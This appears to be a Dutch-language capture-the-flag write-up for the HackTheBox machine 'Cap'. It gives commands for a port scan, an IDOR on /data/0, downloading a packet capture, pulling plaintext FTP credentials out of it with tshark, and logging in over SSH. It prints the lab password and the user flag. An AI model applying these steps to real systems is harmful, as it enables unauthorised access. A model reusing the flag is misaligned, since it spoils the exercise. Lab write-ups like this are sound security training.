Welkom bij deze korte technische deep‑dive van de HackTheBox‑machine **Cap**, rated Easy. Ik loop je stap voor stap door de reconnaissance, de initiële toegang en de privilege‑escalatie, met concrete commando’s en tools die je zelf kunt naspelen.

We starten met een standaard poortscan. Op het doelwit 10.129.19.233 voer ik uit:

```
nmap -sC -sV 10.129.19.233
```

Het resultaat laat drie open poorten zien:

- 21/tcp, open, **vsftpd 3.0.3**
- 22/tcp, open, **OpenSSH 8.2p1** op Ubuntu
- 80/tcp, open, **Gunicorn** dienst die een web‑applicatie serveert genaamd “Security Dashboard”

Anonieme FTP‑login wordt geprobeerd, maar levert geen toegang op, dus we richten ons op de web‑service op poort 80.

Een snelle blik op de applicatie laat drie endpoints zien in de navigatie: `/capture`, `/ip` en `/netstat`. Het `/capture` endpoint redirect altijd naar `/data/1` en presenteert een vijf‑seconden PCAP‑snapshot met analyse. Door handmatig te proberen met lagere ID’s ontdekken we een IDOR:

```
curl -s http://10.129.19.233/data/0
```

Deze request retourneert een pagina met een download‑knop naar `/download/0`. We halen het bestand op:

```
curl -s http://10.129.19.233/download/0 -o capture.pcap
```

Nu analyseren we de PCAP met **tshark**, specifiek op FTP‑verkeer omdat we weten dat de FTP‑dienst draait:

```
tshark -r capture.pcap -Y "ftp" -T fields -e ftp.request.command -e ftp.request.arg
```

De output toont in platte tekst:

```
USER    nathan
PASS    Buck3tH4TF0RM3!
```

Deze credentials zijn precies wat we nodig hebben voor SSH. We maken een verbinding als de gebruiker *nathan*:

```
ssh nathan@10.129.19.233
# wachtwoord: Buck3tH4TF0RM3!
```

Na succesvolle authenticatie vinden we de user flag in het home‑directory: `2874475212d535da1ca01f207b3a6939`.
